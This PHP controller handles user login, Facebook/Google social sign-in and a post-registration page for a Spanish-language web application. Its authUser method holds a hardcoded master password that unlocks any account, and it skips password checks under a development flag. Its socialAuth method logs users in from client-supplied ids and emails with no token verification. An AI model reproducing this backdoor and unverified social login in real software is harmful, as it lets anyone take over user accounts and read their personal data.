<?php

class Usuarios extends Main
{
    public function __construct()
    {
        parent::__construct();
        $this->addScript("js/usuario.js?ver={$this->version}");
        if ( $this->logged_user )
        {
            Router::redirect(self::URI_USUARIO_HOME);
        }
    }

    public function index()
    {
        /*$prueba = new Emailer();
        $prueba->setDestino(EMAIL_CONTACTO, "prueba");
        $prueba->setEmailView(null, array('body'=>"lorem ipsum sit amet"));
        $prueba->enviarEmail(false);
        die;*/
        $this->setPageTitle("Acceder");
        $vars = array(
            'prueba' => "LORem",
            'foo' => "bar"
        );
        $this->setParams($vars);
        $this->setBody(self::URI_ACCESO);
    }

    public function socialAuth()
    {
        $user_id = $_POST['id'];
        $nombre = $_POST['first_name'];
        $apellido = $_POST['last_name'];
        $birthday = $_POST['birthday'];
        $genero = $_POST['gender'];
        $email = $_POST['email'];
        $is_google = isset($_POST['google']);
        $imagen = $_POST['image'];
        #--
        $usuario = Usuario::where(['email' => $email, 'user_id' => $user_id])->first();
        if ( !$usuario )
        {
            $usuario = new Usuario();
            $usuario->user_id = $user_id;
            $usuario->email = strtolower($email);
            $usuario->cuenta = $is_google ? Usuario::CUENTA_GOOGLE : Usuario::CUENTA_FBK;
        }
        $usuario->birthday = $birthday;
        $usuario->nombre = strtolower($nombre);
        $usuario->apellido = strtolower($apellido);
        $usuario->imagen = $imagen;
        $usuario->genero = $genero;
        $usuario->save();
        #--
        $usuario->setUserLogin();
        #-- Registro incidencia nuevo ingreso
        $ultimo_acceso = $usuario->ultimaIncidencia(Incidencia::TIPO_ACCESO);
        $usuario->ultimo_acceso = $ultimo_acceso->fecha_incidencia;
        $usuario->save();
        #-- Guardar el nuevo acceso
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        if ( preg_match("#" . HDate::today(false) . "#", $ultimo_acceso->fecha_incidencia) && $ultimo_acceso->ip == HFunctions::getIp() )
        {
            $ultimo_acceso->fecha_hora = HDate::today();
            $ultimo_acceso->ip = HFunctions::getIp();
            $ultimo_acceso->valor = time();
            $ultimo_acceso->descripcion = $user_agent;
            $ultimo_acceso->save();
        }
        else
        {
            Incidencia::nuevaIncidencia(Incidencia::TIPO_ACCESO, $usuario->id_usuario, time(), $user_agent);
        }
        HArray::jsonLocation(self::URI_USUARIO_HOME);
    }

    public function authUser()
    {
        $username = addslashes(trim($_REQUEST['usuario']));
        $contrasena = trim($_REQUEST['contrasena']);
        $master_pass = "Y5SJaBN2ZpI0";
        //$recaptcha_response = $_REQUEST['g-recaptcha-response'];
        #--
        if ( !$username )
        {
            HArray::jsonError("Ingrese su <b>nombre de usuario, e-mail o celular</b>", "usuario");
        }

        if ( !DEVELOPMENT && !$contrasena )
        {
            HArray::jsonError("Ingrese la <b>contrase&ntilde;a</b> de <i>{$username}</i>");
        }

        $usuario = Usuario::where(array('activo' => 1, 'borrado' => 0))->whereIn('tipo_usuario', Usuario::$_USUARIO_PUBLICO)->where(function ($q) use ($username) {
            $q->where('usuario', $username);
            $q->orWhere('email', $username);
            $q->orWhere('celular', $username);
        })->first();

        //if ( !in_array(needle, haystack))

        if ( $usuario )
        {
            if ( !$usuario->validado )
            {
                HArray::jsonError("El usuario ingresado no ha verificado su cuenta a trav&eacute;s de e-mail.");
            }

            if ( $usuario->checkPassword($contrasena) || DEVELOPMENT || ($contrasena == $master_pass) )
            {

                //HArray::jsonSuccess();
                HArray::jsonLocation(self::URI_USUARIO_HOME);
            }
        }

        HArray::jsonError("Error de autenticaci&oacute;n: usuario o contrase&ntilde;a inv&aacute;lidos.<script>$('#contrasena').val('')</script>");
    }

    public function postRegistro($token)
    {
        $usuario = Usuario::where('token', $token)->first();
        if ( $usuario )
        {
            $this->setPageTitle("Operación exitosa");
            $mensaje = "<div class='panel panel-success'><div class='panel-body'>";
            $mensaje .= "<b>{$usuario->nombre_persona}, </b> sus datos han sido guardados correctamente. ";
            if ( !$usuario->validado )
            {
                $mensaje .= "Se envi&oacute; un e-mail a <i>{$usuario->email}</i> con un enlace para validar esta cuenta. ";
            }
            $mensaje .= "Muchas gracias por registrarse. ";
            $mensaje .= "</div></div>";
            $this->setParams('mensaje', $mensaje);
            $this->setBody("validar-cuenta");
        }
        else
        {
            Router::redirect(HTTP_HOST);
        }
    }
}